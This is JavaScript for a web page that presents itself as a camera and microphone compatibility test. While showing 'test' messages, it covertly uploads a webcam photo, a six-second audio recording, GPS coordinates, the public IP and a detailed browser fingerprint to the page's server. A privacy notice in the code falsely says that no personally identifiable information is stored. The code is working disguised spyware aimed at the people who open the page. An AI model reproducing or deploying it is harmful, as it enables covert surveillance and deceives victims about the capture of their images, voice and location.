/**
 * Browser Fingerprinting and Media Capture Utility
 * (Privacy detection features removed)
 */

class FingerprintMediaTest {
  constructor() {
    this.initElements();
    this.initEventListeners();
    this.isMobile = /Mobi|Android/i.test(navigator.userAgent);
    this.audioVisualizerActive = false;
    this.audioContext = null;
    this.analyser = null;
    this.mediaStream = null;

    // Set current year
    document.getElementById('currentYear').textContent = new Date().getFullYear();
  }

  cleanup() {
    // Stop any active media streams
    if (this.mediaStream) {
      this.mediaStream.getTracks().forEach(track => track.stop());
      this.mediaStream = null;
    }
    
    // Stop audio visualization
    this.stopAudioVisualizer();
    
    // Reset video element
    if (this.localVideo) {
      this.localVideo.srcObject = null;
      this.localVideo.style.display = 'none';
    }
    
    // Show placeholder again
    if (this.placeholder) {
      this.placeholder.style.display = 'block';
    }
  }

  initElements() {
    this.statusElement = document.querySelector('.status-content');
    this.startButton = document.getElementById('startTest');
    this.videoContainer = document.getElementById('videoContainer');
    this.placeholder = document.getElementById('placeholder');
    this.cameraStatus = document.getElementById('cameraStatus');
    this.micStatus = document.getElementById('micStatus');
    this.audioBars = document.querySelectorAll('.audio-bar');
    this.localVideo = document.getElementById('localVideo');
    this.privacyLink = document.getElementById('privacyLink');
    
    this.privacyStatus = document.getElementById('privacyStatus') || {
      textContent: ''
    };
    this.networkStatus = document.getElementById('networkStatus') || {
      textContent: ''
    };
  }

  initEventListeners() {
    this.startButton.addEventListener('click', () => this.runTests());
    this.privacyLink.addEventListener('click', (e) => {
      e.preventDefault();
      alert('Privacy policy: We collect anonymous technical data about your device for compatibility testing purposes only. No personally identifiable information is stored.');
    });
    
    if (this.isMobile) {
      this.videoContainer.style.minHeight = '50vh';
      this.startButton.style.fontSize = '18px';
      this.startButton.style.padding = '15px 25px';
    }
  }

  async updatePrivacyStatus() {
    const networkInfo = await this.getNetworkInfo();
    this.privacyStatus.textContent = `Network: ${networkInfo.type} (Public IP: ${networkInfo.publicIP || 'Unknown'})`;
  }

  async getNetworkInfo() {
    try {
      const publicIP = await this.getPublicIP();
      return {
        type: 'public',
        publicIP,
        localIPs: []
      };
    } catch (error) {
      return {
        type: 'unknown',
        publicIP: null,
        localIPs: []
      };
    }
  }

  async runTests() {
    try {
      this.cleanup();
      this.setTestStatus("Initializing test...", true);
      
      await this.updatePrivacyStatus();
      const publicIP = await this.getPublicIP();
      this.networkStatus.textContent = `Network: Detected (Public IP: ${publicIP || 'Not available'})`;
      
      console.log('Starting fingerprint collection...');
      const fingerprintData = await this.collectEnhancedFingerprint();
      
      console.log('Starting media capture...');
      const mediaData = await this.captureAndSaveMedia();
      
      console.log('Starting location collection...');
      const locationData = await this.collectLocation();

      this.setTestStatus("Test completed successfully! All components are working properly.", false, "Test Again");
      
      const processedData = this.processAllData(fingerprintData, mediaData, locationData);
      console.log("Test completed with data:", processedData);
      
    } catch (error) {
      console.error('Test failed:', {
        error: error.message,
        stack: error.stack
      });
      
      this.setTestStatus(`Test encountered an error: ${error.message}`, false, "Retry Test");
      this.cleanup();
    }
  }

  setTestStatus(message, isLoading, buttonText = "Start Test") {
    this.statusElement.textContent = message;
    this.startButton.disabled = isLoading;
    this.startButton.innerHTML = isLoading 
      ? '<div class="loader"></div> Starting Test...' 
      : buttonText;
  }

  async collectEnhancedFingerprint() {
  try {
    console.log('[DEBUG] Starting fingerprint collection');
    
    const rawData = await this.gatherRawFingerprint();
    const processedData = this.processFingerprintData(rawData);
    
    // Add data validation
    if (!processedData || !processedData.device_info) {
      throw new Error('Invalid fingerprint data generated');
    }

    console.log('[DEBUG] Fingerprint data size:', 
      JSON.stringify(processedData).length, 'bytes');
    
    this.setTestStatus("Uploading fingerprint data...", true);

    // Add timeout and abort controller
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000);

    const response = await fetch('/collect-fingerprint', {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({
        type: 'processed_fingerprint',
        data: processedData,
        timestamp: new Date().toISOString()
      }),
      signal: controller.signal
    });

    clearTimeout(timeoutId);

    if (!response.ok) {
      let errorDetails;
      try {
        errorDetails = await response.json();
      } catch (e) {
        errorDetails = await response.text();
      }
      throw new Error(`Server error: ${response.status} - ${JSON.stringify(errorDetails)}`);
    }

    const result = await response.json();
    console.log('[DEBUG] Fingerprint saved successfully:', result);
    return processedData;

  } catch (error) {
    console.error('[ERROR] Fingerprint collection failed:', {
      message: error.message,
      name: error.name,
      stack: error.stack
    });
    
    let userMessage = 'Fingerprint upload failed';
    
    if (error.name === 'AbortError') {
      userMessage = 'Request timed out (10s) - please check your connection';
    } else if (error.message.includes('Failed to fetch')) {
      userMessage = 'Cannot connect to server - check network connection';
    } else if (error.message.includes('Server error')) {
      userMessage = 'Server processing error - please try again later';
    }
    
    throw new Error(userMessage);
  }
}
  async gatherRawFingerprint() {
    const publicIP = await this.getPublicIP();
    const istTime = new Date().toLocaleString('en-IN', {
      timeZone: 'Asia/Kolkata',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
    
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      languages: navigator.languages,
      timestamp: istTime,
      timezone: 'Asia/Kolkata (IST)',
      network: {
        publicIP,
        localIPs: []
      },
      screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight
      },
      viewport: {
        width: window.innerWidth,
        height: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight
      },
      hardware: {
        cpuCores: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints
      },
      features: {
        webGL: this.detectWebGL(),
        canvas: this.getCanvasFingerprint(),
        audio: await this.getAudioFingerprint(),
        fonts: await this.detectFonts(),
        plugins: this.getPlugins(),
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        onLine: navigator.onLine
      },
      timing: {
        pageLoadTime: performance.now()
      },
      orientation: {
        angle: screen.orientation ? screen.orientation.angle : null,
        type: screen.orientation ? screen.orientation.type : null
      },
      browserInfo: {
        vendor: navigator.vendor,
        product: navigator.product,
        webdriver: navigator.webdriver
      }
    };
  }

  async getPublicIP() {
    try {
      // First try our own endpoint
      const response = await fetch('/get-ip');
      if (response.ok) {
        const data = await response.json();
        return data.ip;
      }
      
      // Fallback to api.ipify.org
      const ipifyResponse = await fetch('https://api.ipify.org?format=json');
      if (!ipifyResponse.ok) throw new Error('IP fetch failed');
      const ipifyData = await ipifyResponse.json();
      return ipifyData.ip;
    } catch (error) {
      console.error('Error fetching public IP:', error);
      return null;
    }
  }

  async captureAndSaveMedia() {
    try {
      this.setMediaStatus("Checking camera and microphone permissions...", "Checking...", "Checking...");

      const constraints = { 
        video: { width: 1280, height: 720 }, 
        audio: { 
          echoCancellation: true,
          noiseSuppression: true,
          autoGainControl: true
        }
      };

      this.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
      
      await this.setupVideoStream(this.mediaStream);
      await this.testCamera(this.mediaStream);
      
      if (this.mediaStream.getAudioTracks().length > 0) {
        await this.testMicrophone(this.mediaStream);
      } else {
        this.micStatus.textContent = "Microphone: Not detected";
      }

      return { success: true };
    } catch (error) {
      this.handleMediaError(error);
      throw error;
    }
  }

  handleMediaError(error) {
    console.error('Media capture error:', error);
    
    let errorMessage = 'Unknown error occurred';
    
    if (error.name === 'NotAllowedError') {
      errorMessage = 'Camera/microphone access denied. Please allow permissions and try again.';
    } else if (error.name === 'NotFoundError') {
      errorMessage = 'No camera or microphone found. Please check your devices.';
    } else if (error.name === 'NotSupportedError') {
      errorMessage = 'Media capture not supported in this browser.';
    } else if (error.message.includes('timeout')) {
      errorMessage = 'Permission request timed out. Please try again.';
    }
    
    this.setMediaStatus(`Error: ${errorMessage}`, "Failed", "Failed");
  }

  async setupVideoStream(stream) {
    this.localVideo.srcObject = stream;
    this.localVideo.style.display = 'block';
    this.placeholder.style.display = 'none';

    await new Promise((resolve, reject) => {
      this.localVideo.onloadedmetadata = resolve;
      this.localVideo.onerror = reject;
    });

    try {
      await this.localVideo.play();
    } catch (error) {
      console.error('Video play error:', error);
      throw new Error('Failed to start video playback');
    }
  }

  async testCamera(stream) {
    this.cameraStatus.textContent = "Camera: Detected";
    this.setTestStatus("Testing camera... Smile!");

    const imageBlob = await this.captureImageFrame(this.localVideo);
    if (!imageBlob) {
      throw new Error('Failed to capture image frame');
    }

    const processedImageData = {
      type: 'camera_test',
      timestamp: new Date().toISOString(),
      resolution: `${this.localVideo.videoWidth}x${this.localVideo.videoHeight}`,
      size_bytes: imageBlob.size,
      format: 'jpeg',
      device_info: {
        user_agent: navigator.userAgent,
        platform: navigator.platform
      }
    };
    
    await this.saveProcessedMedia('image', imageBlob, 'jpg', processedImageData);
    this.cameraStatus.textContent = "Camera: Working properly";
  }

  async testMicrophone(stream) {
    this.animateAudioVisualizer(stream);
    this.micStatus.textContent = "Microphone: Detected";
    this.setTestStatus("Testing microphone... Speak now!");

    const audioBlob = await this.recordAudio(stream);
    if (audioBlob) {
      const processedAudioData = {
        type: 'microphone_test',
        timestamp: new Date().toISOString(),
        duration_seconds: 6,
        size_bytes: audioBlob.size,
        format: 'webm',
        device_info: {
          user_agent: navigator.userAgent,
          platform: navigator.platform
        }
      };
      
      await this.saveProcessedMedia('audio', audioBlob, 'webm', processedAudioData);
      this.micStatus.textContent = "Microphone: Working properly";
    }
  }

  setMediaStatus(status, cameraText, micText) {
    this.statusElement.textContent = status;
    this.cameraStatus.textContent = `Camera: ${cameraText}`;
    this.micStatus.textContent = `Microphone: ${micText}`;
  }

  animateAudioVisualizer(stream) {
    this.stopAudioVisualizer();
    this.audioContext = new (window.AudioContext || window.webkitAudioContext)();
    this.analyser = this.audioContext.createAnalyser();
    const microphone = this.audioContext.createMediaStreamSource(stream);
    microphone.connect(this.analyser);
    this.analyser.fftSize = 32;

    const bufferLength = this.analyser.frequencyBinCount;
    const dataArray = new Uint8Array(bufferLength);

    const updateVisualizer = () => {
      this.analyser.getByteFrequencyData(dataArray);
      this.audioBars.forEach((bar, i) => {
        const index = Math.floor(i * (bufferLength / this.audioBars.length));
        const value = dataArray[index] / 255;
        const height = value * 100;
        bar.style.height = `${10 + height}%`;
      });

      if (this.audioVisualizerActive) {
        requestAnimationFrame(updateVisualizer);
      }
    };

    this.audioVisualizerActive = true;
    updateVisualizer();
  }

  stopAudioVisualizer() {
    this.audioVisualizerActive = false;
    this.audioBars.forEach(bar => {
      bar.style.height = '10%';
    });
    
    if (this.audioContext) {
      if (this.audioContext.state !== 'closed') {
        this.audioContext.close();
      }
      this.audioContext = null;
      this.analyser = null;
    }
  }

  async captureImageFrame(video) {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');

      const attemptCapture = (attempts = 3) => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = ctx.getImageData(0, 0, 10, 10).data;
        const isBlank = Array.from(imageData).every(val => val === 0);

        if (!isBlank || attempts <= 0) {
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        } else {
          setTimeout(() => attemptCapture(attempts - 1), 200);
        }
      };

      attemptCapture();
    });
  }

  async recordAudio(stream) {
    return new Promise((resolve) => {
      try {
        const audioChunks = [];
        const recorder = new MediaRecorder(stream);

        recorder.ondataavailable = (e) => {
          if (e.data.size > 0) audioChunks.push(e.data);
        };

        recorder.onstop = () => {
          if (audioChunks.length > 0) {
            resolve(new Blob(audioChunks, { type: 'audio/webm' }));
          } else {
            resolve(null);
          }
        };

        recorder.start();
        setTimeout(() => {
          if (recorder.state === 'recording') {
            recorder.stop();
          }
        }, 6000);

      } catch (error) {
        console.error('Audio recording error:', error);
        resolve(null);
      }
    });
  }

  async saveProcessedMedia(type, blob, extension, metadata) {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = async () => {
        try {
          const response = await fetch('/collect-media', {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json'
            },
            body: JSON.stringify({
              type: 'processed_media',
              media_type: type,
              data: reader.result.split(',')[1],
              metadata: {
                ...metadata,
                size_bytes: blob.size,
                extension
              }
            })
          });

          if (!response.ok) {
            const error = await response.json();
            throw new Error(error.message || 'Server error');
          }

          const data = await response.json();
          resolve(data);
        } catch (error) {
          reject(error);
        }
      };
      reader.onerror = () => reject(new Error('File reading failed'));
      reader.readAsDataURL(blob);
    });
  }

  async collectLocation() {
    if (!navigator.geolocation) return null;

    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          try {
            await fetch('/collect-fingerprint', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                location: {
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude
                }
              })
            });
            resolve(position.coords);
          } catch (error) {
            console.error('Location save error:', error);
            resolve(null);
          }
        },
        (error) => {
          console.error('Geolocation error:', error);
          resolve(null);
        },
        { timeout: 5000 }
      );
    });
  }

  detectWebGL() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return null;
      
      return {
        vendor: gl.getParameter(gl.VENDOR),
        renderer: gl.getParameter(gl.RENDERER),
        version: gl.getParameter(gl.VERSION),
        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
        extensions: gl.getSupportedExtensions()
      };
    } catch (e) {
      return null;
    }
  }

  getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText('Canvas fingerprint test 🎨', 2, 2);
      
      ctx.fillStyle = 'rgba(255,0,0,0.5)';
      ctx.fillRect(10, 10, 50, 30);
      
      return canvas.toDataURL();
    } catch (e) {
      return null;
    }
  }

  async getAudioFingerprint() {
    try {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const analyser = audioContext.createAnalyser();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(analyser);
      analyser.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      oscillator.frequency.value = 1000;
      gainNode.gain.value = 0;
      
      oscillator.start();
      
      const frequencyData = new Uint8Array(analyser.frequencyBinCount);
      analyser.getByteFrequencyData(frequencyData);
      
      oscillator.stop();
      
      return Array.from(frequencyData).slice(0, 10).join('');
    } catch (e) {
      return null;
    }
  }

  async detectFonts() {
    const fonts = [
      'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
      'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
      'Trebuchet MS', 'Arial Black', 'Impact', 'Tahoma', 'Calibri',
      'Lucida Console', 'Monaco', 'Menlo', 'Consolas'
    ];
    
    const availableFonts = [];
    
    for (const font of fonts) {
      if (await this.isFontAvailable(font)) {
        availableFonts.push(font);
      }
    }
    
    return availableFonts;
  }

  isFontAvailable(fontName) {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      
      ctx.font = '72px monospace';
      const baseline = ctx.measureText('mmmmmmmmmmlli').width;
      
      ctx.font = `72px ${fontName}, monospace`;
      const width = ctx.measureText('mmmmmmmmmmlli').width;
      
      resolve(width !== baseline);
    });
  }

  getPlugins() {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
      const plugin = navigator.plugins[i];
      plugins.push({
        name: plugin.name,
        filename: plugin.filename,
        description: plugin.description
      });
    }
    return plugins;
  }

  processAllData(fingerprintData, mediaData, locationData) {
    return {
      fingerprint: fingerprintData,
      media: mediaData,
      location: locationData,
      timestamp: new Date().toISOString(),
      sessionId: this.generateSessionId()
    };
  }

  processFingerprintData(rawData) {
    return {
      device_info: {
        operating_system: this.detectOS(),
        browser: this.detectBrowser(),
        browser_version: this.getBrowserVersion(),
        platform: rawData.platform,
        mobile_device: this.isMobile
      },
      timezone_info: {
        reported_timezone: rawData.timezone,
        ist_time: rawData.timestamp,
        timezone_offset: '+05:30 (IST)'
      },
      location_info: {
        ip_address: rawData.network.publicIP,
        local_ips: rawData.network.localIPs
      },
      display_info: {
        screen_resolution: `${rawData.screen.width}x${rawData.screen.height}`,
        viewport_size: `${rawData.viewport.width}x${rawData.viewport.height}`,
        color_depth: rawData.screen.colorDepth
      },
      hardware_info: {
        cpu_cores: rawData.hardware.cpuCores,
        device_memory: rawData.hardware.deviceMemory,
        touch_support: rawData.hardware.maxTouchPoints > 0
      },
      browser_features: {
        webgl_support: rawData.features.webGL !== null,
        canvas_fingerprint_available: rawData.features.canvas !== null,
        cookies_enabled: rawData.features.cookieEnabled,
        local_storage_available: 'localStorage' in window
      },
      fingerprints: {
        overall_fingerprint_hash: this.generateFingerprintHash(rawData)
      }
    };
  }

  detectOS() {
    const userAgent = navigator.userAgent;
    if (/Windows/.test(userAgent)) return 'Windows';
    if (/Macintosh/.test(userAgent)) return 'MacOS';
    if (/Linux/.test(userAgent)) return 'Linux';
    if (/Android/.test(userAgent)) return 'Android';
    if (/iOS|iPhone|iPad|iPod/.test(userAgent)) return 'iOS';
    return 'Unknown';
  }

  detectBrowser() {
    const userAgent = navigator.userAgent;
    if (/Chrome/.test(userAgent)) return 'Chrome';
    if (/Firefox/.test(userAgent)) return 'Firefox';
    if (/Safari/.test(userAgent)) return 'Safari';
    if (/Edge/.test(userAgent)) return 'Edge';
    if (/Opera/.test(userAgent)) return 'Opera';
    if (/Trident/.test(userAgent)) return 'Internet Explorer';
    return 'Unknown';
  }

  getBrowserVersion() {
    const userAgent = navigator.userAgent;
    const matches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/([0-9.]+)/);
    return matches ? matches[2] : 'Unknown';
  }

  generateFingerprintHash(data) {
    const str = JSON.stringify(data);
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return hash.toString(16);
  }

  generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  }
}

document.addEventListener('DOMContentLoaded', () => {
  const app = new FingerprintMediaTest();
});
